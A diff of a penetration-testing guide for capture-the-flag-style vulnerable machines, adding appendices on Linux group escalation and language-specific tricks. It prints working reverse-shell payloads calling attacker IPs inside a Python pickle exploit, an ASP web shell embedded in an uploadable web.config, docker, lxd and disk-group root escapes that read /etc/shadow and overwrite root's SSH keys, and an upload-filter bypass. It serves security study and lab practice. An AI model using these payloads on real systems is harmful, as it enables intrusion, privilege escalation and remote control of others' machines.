@@ -21,6 +21,8 @@ In this blog post, we have mentioned, what can be done in each separate stage. F
 - :ref:`A1-Local-file-Inclusion`
 - :ref:`A2-File-Upload`
 - :ref:`A3-Tranfer-Files-From-Linux-to-Windows`
+- :ref:`A4-Linux-Group-Membership-Issues`
+- :ref:`A5-Coding-Languages-Tricks`
 
 .. _finding-the-ip-address:
 
@@ -1621,7 +1623,8 @@ Once, we have got the unprivileged shell, it is very important to check the belo
 * What are the services running? (netstat -ln)
 * Check the entries in the crontab!
 * What are the files present in the /home/user folder? Are there any hidden files and folders? like .thunderbird/ .bash_history etc.
-
+* What groups does the user belong to (adm, audio, video, disk)? 
+* What other users are logged on the linux box (command w)? 
 
 What "Advanced Linux File Permissions" are used?
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
@@ -1680,7 +1683,7 @@ After compromising the machine with an unprivileged shell, /home would contains 
   find / -group groupname 2> /dev/null
 
 
-.. Tip :: Find files by wheel/ adm users or the users in the home directory.
+.. Tip :: Find files by wheel/ adm users or the users in the home directory. If the user is member of other groups (such as audio, video, disk), it might be a good idea to check for files owned by particular groups.
 
 Other Linux Privilege Escalation
 --------------------------------
@@ -1881,7 +1884,7 @@ In the below code, we are linking the file which we have access (/tmp/hello.txt)
 
 ::
 
-  while true; do ln -sf /tmp/hello.txt /tmp/token; ln -sf /home/flag10/token /tmp/token ; done
+  while true; do ln -sf /tmp/hello.txt /tmp/token; ln -sf /home/flagXX/token /tmp/token ; done
 
 We would also run the program in a while loop
 
@@ -1891,7 +1894,7 @@ We would also run the program in a while loop
 
 Learning:
 
-Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.” 
+Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.
 
 Writable /etc/passwd or account credentials came from a legacy unix system
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
@@ -2906,10 +2909,9 @@ Tricks
 
  it would create a tmp folder in the /home/user/ and save the file in that. However, if you current directory is /, it would save the file in /tmp folder, from where you can execute stuff.
 
-* wget accepts IP address in decimal format 
+* wget accepts IP address in decimal format
 
-
-
+* wget shortens the filename if it's too long. For example, if you provide a filename to the wget which is very long (i.e around 255 character), wget might shorten it. This might be helpful in cases where only a jpg file is allowed to be uploaded, however as wget shortens it, we may try aaaaaaaaaaaa (*255/ somenumber).php.jpg and wget shortens it to aaaaaaa(*255).php
 
 SSH
 ---
@@ -3217,91 +3219,6 @@ Delete all lines between tags including tags:
 HTTP 404 Custom Page
 ^^^^^^^^^^^^^^^^^^^^
 Sometimes, it's a good idea to look at 404 custom page also. There might be some information stored.
-
-PHP
-^^^
-
-* PHP's preg_replace() function which can lead to RCE. It's deprecated in later revisions (PHP >= 5.5.0). If you think there's a pattern which is replaced in a text, refer `The unexpected dangers of preg_replace() <https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace>`_ and `Exploiting PHP PCRE Functions <http://www.madirish.net/402>`_ 
-
-* PHP has `Complex (curly) syntax <http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex>`_ The Complex Syntax to allow evaluation of our own code in double quotes. 
-  
-  Example
-  
-  :: 
-  
-   $use_me = "ls -lah"
-   {${system($use_me)}}
-
-  This works because the outside curly brackets say give the contents of a variable/method/has to start with $, which is why we need the inner ${} to act as a variable. {${system($use_me)}} means, give the contents of ${system($use_me)} which in turn means use the contents of a variable named by the output of system($use_me).
-
-Docker Security
----------------
-
-Any user who is part of the docker group should also be considered root. Read `Using the docker command to root the host <http://reventlov.com/advisories/using-the-docker-command-to-root-the-host>`_ Older version of docker were vulnerable to Docker breakout. More details at `Shocker / Docker Breakout PoC <https://github.com/gabrtv/shocker>`_
-
-If you are the docker user and want to get root. 
-
-Create a Dockerfile
-^^^^^^^^^^^^^^^^^^^
-
-::
-
- mkdir docker-test
- cd docker-test
-
- cat > Dockerfile
- FROM debian:wheezy
- ENV WORKDIR /stuff
- RUN mkdir -p $WORKDIR
- VOLUME [ $WORKDIR ]
- WORKDIR $WORKDIR
-
-Build the Docker
-^^^^^^^^^^^^^^^^
-
-::
-
- docker build -t my-docker-image .
-
-Become root?
-^^^^^^^^^^^^
-
-* Copy binaries from the container into the host and give them suid permissions:
-
- ::
-
-  docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh'
-
-  ./sh
-  whoami
-  # root
-
- If the sh is not working, create a suid.c, compile it, suid it and run.
-
-* Mount system directories into docker and ask docker to read (and write) restricted files that should be out of your user’s clearance:
-
- ::
-
-
-  docker run -v /etc:/stuff -t my-docker-image /bin/sh -c 'cat shadow'
-  # root:!:16364:0:99999:7:::
-  # daemon:*:16176:0:99999:7:::
-  # bin:*:16176:0:99999:7:::
-  # ...
-
-* Bind the host’s / and overwrite system commands with rogue programs:
-
- ::
-
-  docker run -v /:/stuff -t my-docker-image /bin/sh -c 'cp /stuff/rogue-program /stuff/bin/cat'
-
-* Privileged copy of bash for later access?
-
- ::
-
-  docker run -v /:/stuff -t my-docker-image /bin/sh -c 'cp /stuff/bin/bash /stuff/bin/root-shell-ftw && chmod a+s /stuff/bin/root-shell-ftw'
-  root-shell-ftw  -p
-  root-shell-ftw-4.3#
 
 Password Protected File
 ------------------------
@@ -3698,72 +3615,6 @@ Grep in input box?
 
  This command searches for any character in the file and comments out the reference to dictionary.txt
 
-Python Pickle
--------------
-
-If a website is using pickle to serialize and de-serialize the requests and probably using a unsafe way like 
-
-::
-
-  cPickle.loads(data)
-
-The pickle website say *Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.*
-
-we may use
-
-::
-
-  class Shell_code(object):
-  def __reduce__(self):
-          return (os.system,('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))
-     or   return (os.system,('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.XX 4444 >/tmp/f')
-  shell = cPickle.dumps(Shell_code())
-
-if we print shell variable above, it would look something like below if python version 2 is used
-
-::
-
- cposix
- system
- p1
- (S'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.XX 4444 >/tmp/f'
- p2
- tp3
- Rp4
- .
-
-and in python version 3
-
-::
-
- b'\x80\x03cposix\nsystem\nq\x00XT\x00\x00\x00/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.26 4444 >/tmp/fq\x01\x85q\x02Rq\x03.'
-
-Pickle is imported in python 3 as
-
-::
- 
- import _pickle as cPickle
-
-and in python 2
-
-::
-
- import cPickle
-
-
-Now, we can test locally that our code for shell is working by unpickling by
-
-::
-
- #data.txt containing our Pickled data
- import cPickle
- path = "/tmp/data.txt"
- data = open(path, "rb").read()
- item = cPickle.loads(data)
-
-Refer `Understanding Python pickling and how to use it securely <https://www.synopsys.com/blogs/software-security/python-pickling/>`_ , `Sour Pickles <http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf>`_ and `Exploiting misuse of Python's "pickle" <https://blog.nelhage.com/2011/03/exploiting-pickle/>`_
-
-.. Tip :: It might be good idea to use requests (in case of Website) or socket (in case of listener) to send the payload.
 
 Others
 ------
@@ -4699,6 +4550,57 @@ Now, when we press submit button, probably, just make sure that the request is q
 
 .. Tip :: Sometimes, there might be cases when the developer has a commented a input type on the client side, however has forgotten to comment on the serverside code! Maybe, try to uncomment and see what happens!
 
+IIS - Web.config Upload
+^^^^^^^^^^^^^^^^^^^^^^^
+
+If we are able to upload a web.config file by a file upload functionality in IIS - Windows machine, there might be a possibility of remote code execution.
+
+A web.config file lets you customize the way site or a specific directory on site behaves. For example, if you place a web.config file in your root directory, it will affect your entire site. If you place it in a /content directory, it will only affect that directory.
+
+With a web.config file, you can control:
+
+* Database connection strings.
+* Error behavior.
+* Security.
+
+Refer `Upload a web.config File for Fun & Profit <https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/>`_ and `RCE by uploading a web.config <https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/>`_ 
+
+We can upload the below web.config
+
+::
+
+ <?xml version="1.0" encoding="UTF-8"?>
+ <configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+ </configuration>
+ <%
+ set cmd = Request.QueryString("cmd")
+ Set os = Server.CreateObject("WSCRIPT.SHELL")
+ output = os.exec("cmd.exe /c " + cmd).stdout.readall
+ response.write output
+ %>
+
+The above expects a parameter cmd which is executed using wscript.shell and can be executed like
+
+::
+
+  http://IP/uploads/web.config?cmd=whoami
+
+
 
 .. _A3-Tranfer-Files-From-Linux-to-Windows:
 
@@ -5074,10 +4976,398 @@ Installing tftp - Windows
 
   pkgmgr /iu:"TFTP"
 
+
+.. _A4-Linux-Group-Membership-Issues:
+
+Appendix-IV Linux Group Membership Issues?
+==========================================
+
+Let's examine in what groups we are members. Recommended read about groups: `Users and Groups <https://wiki.archlinux.org/index.php/users_and_groups>`_ and `System Groups <https://wiki.debian.org/SystemGroups>`_
+
+Docker Group
+---------------
+
+Any user who is part of the docker group should also be considered root. Read `Using the docker command to root the host <http://reventlov.com/advisories/using-the-docker-command-to-root-the-host>`_ Older version of docker were vulnerable to Docker breakout. More details at `Shocker / Docker Breakout PoC <https://github.com/gabrtv/shocker>`_
+
+If you are the docker user and want to get root. 
+
+Create a Dockerfile
+^^^^^^^^^^^^^^^^^^^
+
+::
+
+ mkdir docker-test
+ cd docker-test
+
+ cat > Dockerfile
+ FROM debian:wheezy
+ ENV WORKDIR /stuff
+ RUN mkdir -p $WORKDIR
+ VOLUME [ $WORKDIR ]
+ WORKDIR $WORKDIR
+
+Build the Docker
+^^^^^^^^^^^^^^^^
+
+::
+
+ docker build -t my-docker-image .
+
+
+.. Note :: If there are already docker images present on the host machine, we can utilize those also instead of making a new one. If there are none, we can copy a image to the vulnerable machine.
+
+**Copy docker images from one host to another without via repository?**
+
+Save the docker image as a tar file:
+
+::
+
+ docker save -o <path for generated tar file> <image name>
+
+Then copy the image to a new system with regular file transfer tools such as cp or scp. After that, load the image into docker:
+
+:: 
+
+ docker load -i <path to image tar file>
+
+Become root?
+^^^^^^^^^^^^
+
+* Copy binaries from the container into the host and give them suid permissions:
+
+ ::
+
+  docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh'
+
+  ./sh
+  whoami
+  # root
+
+ If the sh is not working, create a suid.c, compile it, suid it and run.
+
+* Mount system directories into docker and ask docker to read (and write) restricted files that should be out of your user’s clearance:
+
+ ::
+
+
+  docker run -v /etc:/stuff -t my-docker-image /bin/sh -c 'cat shadow'
+  # root:!:16364:0:99999:7:::
+  # daemon:*:16176:0:99999:7:::
+  # bin:*:16176:0:99999:7:::
+  # ...
+
+* Bind the host’s / and overwrite system commands with rogue programs:
+
+ ::
+
+  docker run -v /:/stuff -t my-docker-image /bin/sh -c 'cp /stuff/rogue-program /stuff/bin/cat'
+
+* Privileged copy of bash for later access?
+
+ ::
+
+  docker run -v /:/stuff -t my-docker-image /bin/sh -c 'cp /stuff/bin/bash /stuff/bin/root-shell-ftw && chmod a+s /stuff/bin/root-shell-ftw'
+  root-shell-ftw  -p
+  root-shell-ftw-4.3#
+
+Video
+-----
+
+If the user is a part of the video group, he possibly might have access to the frame buffer (/dev/fb0) (which provides an abstraction for the video hardware), video capture devices, 2D/3D hardware acceleration. More details can be found at `Linux Framebuffer <https://en.wikipedia.org/wiki/Linux_framebuffer>`_ and `Kernel Framebuffer <https://www.kernel.org/doc/Documentation/fb/framebuffer.txt>`_
+
+If, we have access to the framebuffer device /dev/fb0. We can use a tool like `fb2png <https://github.com/AndrewFromMelbourne/fb2png>`_ to convert it to a png picture or we can cat it and get a file:
+
+::
+
+ cat /dev/fb0 > screenshot.raw
+
+ ls -l screenshot.raw 
+ -rw-rw-r-- 1 user user 4163040 May 18 03:52 screenshot.raw
+
+To find the screen resolution, we can read virtual size
+
+::
+
+ cat /sys/class/graphics/fb0/virtual_size
+ 1176,885
+
+We can then open the screenshot as a raw file (Select File Type: Raw Image Data) in Gimp, enter the width and height as well of the color arrangement, RGB, RGBA etc.
+
+Disk
+----
+
+Debian's wiki says about the "disk" group: Raw access to disks. Mostly equivalent to root access. The group disk can be very dangerous, since hard drives in /dev/sd* and /dev/hd* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges. Users should never belong to this group.
+
+We can use debugfs command to read everything and dd command to write anywhere.
+
+Read /root/.ssh/authorized_keys using debugfs:
+
+::
+
+ user@hostname:/tmp$ debugfs -w /dev/sda1 -R "cat /root/.ssh/authorized_keys"
+ debugfs 1.42.13 (17-May-2015)
+ ssh-rsa AAAAB3NzaC1yc2EAAAADAQA
+
+Let's find the block where the "/root/.ssh/authorized_keys" file resides:
+
+::
+
+ user@hostname:/tmp$ debugfs /dev/sda1 -R "blocks /root/.ssh/authorized_keys"
+ debugfs 1.42.13 (17-May-2015)
+ 1608806
+
+Let's use dd to write our own public key inside /root/.ssh/authorized_keys. This command will write over (i.e. it will replace) the old data:
+
+::
+
+ user@hostname:/tmp$ dd if=/tmp/id_rsa.pub of=/dev/sda1 seek=1608806 bs=4096 count=1
+ 0+1 records in
+ 0+1 records out
+ 394 bytes copied, 0.00239741 s, 164 kB/s
+
+It's important to sync afterwards:
+
+::
+
+ user@hostname:/tmp$ sync
+
+Read again to check if the file was overwritten
+
+::
+
+ user@hostname:/tmp$ debugfs -w /dev/sda1 -R "cat /root/.ssh/authorized_keys"
+ debugfs 1.42.13 (17-May-2015)
+ ssh-rsa AAAAB3NzaC1yc2EAAAADAQA
+
+More usage details about can be found at `debugfs Command Examples <https://www.cs.montana.edu/courses/309/topics/4-disks/debugfs_example.html>`_
+
+Set file system 
+^^^^^^^^^^^^^^^
+::
+
+ > debugfs /dev/hda6
+ debugfs 1.19, 13-Jul-2000 for EXT2 FS 0.5b, 95/08/09
+
+List files
+^^^^^^^^^^
+
+::
+
+ debugfs:  ls
+ 2790777 (12) .   32641 (12) ..   2790778 (12) dir1   2790781 (16) file1
+ 2790782 (4044) file2
+
+List the files with a long listing
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Format is:
+
+* Field 1:  Inode number.
+* Field 2:  First one or two digits is the type of node:
+ * 2 = Character device
+ * 4 = Directory
+ * 6 = Block device
+ * 10 = Regular file
+ * 12 = Symbolic link
+ * The Last four digits are the Linux permissions
+* Field 3: Owner uid
+* Field 4: Group gid
+* Field 5: Size in bytes.
+* Field 6: Date
+* Field 7: Time of last creation.
+* Field 8: Filename.
+
+::
+
+ debugfs:  ls -l
+ 2790777  40700   2605   2601    4096  5-Nov-2001 15:30 .
+  32641   40755   2605   2601    4096  5-Nov-2001 14:25 ..
+ 2790778  40700   2605   2601    4096  5-Nov-2001 12:43 dir1
+ 2790781 100600   2605   2601      14  5-Nov-2001 15:29 file1
+ 2790782 100600   2605   2601      14  5-Nov-2001 15:30 file2
+
+Dump the contents of file1
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+::
+
+ debugfs: cat file1
+ This is file1
+
+Dump an inode to a file
+^^^^^^^^^^^^^^^^^^^^^^^
+
+Same as cat, but to a file and using inode number instead of the file name.
+
+::
+
+ debugfs: dump <2790782> file1-debugfs
+
+LXD
+---
+
+The below has been taken from `LXD-Escape <https://reboare.github.io/lxd/lxd-escape.html>`_
+
+LXD is Ubuntu’s container manager utilising linux containers. It could be considered to act in the same sphere as docker. The lxd group should be considered harmful in the same way the docker group is. Under no circumstances should a user in a local container be given access to the lxd group.
+
+Exploiting
+^^^^^^^^^^
+
+::
+
+ ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
+ Creating test 
+
+ ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
+ Device whatever added to test 
+
+ ubuntu@ubuntu:~$ lxc start test 
+ ubuntu@ubuntu:~$ lxc exec test bash
+
+Here we have created an lxc container, assigned it security privileges and mounted the full disk under /mnt/root
+
+::
+
+ ubuntu@ubuntu:~$ lxc exec test bash 
+ root@test:~# cd /mnt/root 
+ root@test:/mnt/root# ls 
+ bin   cdrom  etc   initrd.img  lib64       media  opt   root  sbin  srv  tmp  var 
+ boot  dev    home  lib         lost+found  mnt    proc  run   snap  sys  usr  vmlinuz 
+
+ root@test:/mnt/root# cd root 
+ root@test:/mnt/root/root# ls 
+ root@test:/mnt/root/root# touch ICanDoWhatever 
+ root@test:/mnt/root/root# exit 
+ exit 
+
+At this point, we can write a ssh public key to the root/.ssh folder and use that to access the machine.
+
+.. _A5-Coding-Languages-Tricks:
+
+Appendix-V Coding Languages Tricks?
+===================================
+
+Python 
+------
+
+Pickle
+^^^^^^
+
+If a website is using pickle to serialize and de-serialize the requests and probably using a unsafe way like 
+
+::
+
+  cPickle.loads(data)
+
+The pickle website say *Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.*
+
+we may use
+
+::
+
+  class Shell_code(object):
+  def __reduce__(self):
+          return (os.system,('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))
+     or   return (os.system,('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.XX 4444 >/tmp/f',))
+  shell = cPickle.dumps(Shell_code())
+
+if we print shell variable above, it would look something like below if python version 2 is used
+
+::
+
+ cposix
+ system
+ p1
+ (S'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.XX 4444 >/tmp/f'
+ p2
+ tp3
+ Rp4
+ .
+
+and in python version 3
+
+::
+
+ b'\x80\x03cposix\nsystem\nq\x00XT\x00\x00\x00/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.26 4444 >/tmp/fq\x01\x85q\x02Rq\x03.'
+
+Pickle is imported in python 3 as
+
+::
+ 
+ import _pickle as cPickle
+
+and in python 2
+
+::
+
+ import cPickle
+
+
+Now, we can test locally that our code for shell is working by unpickling by
+
+::
+
+ #data.txt containing our Pickled data
+ import cPickle
+ path = "/tmp/data.txt"
+ data = open(path, "rb").read()
+ item = cPickle.loads(data)
+
+Refer `Understanding Python pickling and how to use it securely <https://www.synopsys.com/blogs/software-security/python-pickling/>`_ , `Sour Pickles <http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf>`_ and `Exploiting misuse of Python's "pickle" <https://blog.nelhage.com/2011/03/exploiting-pickle/>`_
+
+.. Tip :: It might be good idea to use requests (in case of Website) or socket (in case of listener) to send the payload.
+
+PHP
+---
+
+Preg_Replace
+^^^^^^^^^^^^
+
+PHP's preg_replace() function which can lead to RCE. It's deprecated in later revisions (PHP >= 5.5.0). If you think there's a pattern which is replaced in a text, refer `The unexpected dangers of preg_replace() <https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace>`_ and `Exploiting PHP PCRE Functions <http://www.madirish.net/402>`_ Under most circumstances the PCRE engine is completely safe. It does, however, provide the /e modifier which allows evaluation of PHP code in the preg_replace function. This can be extremely dangerous if used carelessly.
+
+Complex Curly Syntax
+^^^^^^^^^^^^^^^^^^^^
+
+PHP has `Complex (curly) syntax <http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex>`_ The Complex Syntax to allow evaluation of our own code in double quotes. 
+  
+Example
+  
+:: 
+  
+  $use_me = "ls -lah"
+  {${system($use_me)}}
+
+This works because the outside curly brackets say give the contents of a variable/method/has to start with $, which is why we need the inner ${} to act as a variable. {${system($use_me)}} means, give the contents of ${system($use_me)} which in turn means use the contents of a variable named by the output of system($use_me).
+
+Xdebug
+^^^^^^
+
+If you find uncommon headers such as xdebug in the response, it might be possible to get a reverse shell. Xdebug is a php extension that allows to debug php pages, remotely by using DGBp protocol. Code execution is possible via injections that exist in eval or property_set xdebug commands. Refer `xpwn - exploiting xdebug enabled servers <https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/>`_  and `xdebug-shell <https://github.com/gteissier/xdebug-shell>`_ 
+
+Type Juggling/ Magic Bytes
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Type juggling in PHP is caused by an issue of loose operations versus strict operations. Strict comparisons will compare both the data values and the types associated to them. A loose comparison will use context to understand what type the data is. According to PHP documentation for comparison operations at `Language Operators Comparison <http://php.net/manual/en/language.operators.comparison.php>`_
+
+*If you compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison performed numerically. These rules also apply to the switch statement. The type conversion does not take place when the comparison is === or !== as this involves comparing the type as well as the value.*
+
+So, if == or != is used to do the comparison or the password checks and if md5(of a string/number) results in a hash starting with 0e, there might be a possibility of bug.
+
+Refer `Magic Hashes <https://www.whitehatsec.com/blog/magic-hashes/>`_, `PHP Weak Typing Woes &#8212; With Some Pontification about Code and Pen Testing <https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing#>`_ and `Writing Exploits For Exotic Bug Classes: 
+PHP Type Juggling <http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html>`_ 
+
+
+
+
+LUA
+---
+
+In Lua, when a developer uses unvalidated user data to run operating system commands via the os.execute() or io.popen() Lua functions, there can be command injection. A good paper to read is `Lua Web Application Security Vulnerabilities <http://seclists.org/fulldisclosure/2014/May/128>`_
+
+
 Changelog
 =========
 .. git_changelog::
   :filename_filter: docs/LFC-VulnerableMachines.rst
-  :hide_date: false
 
 .. disqus::
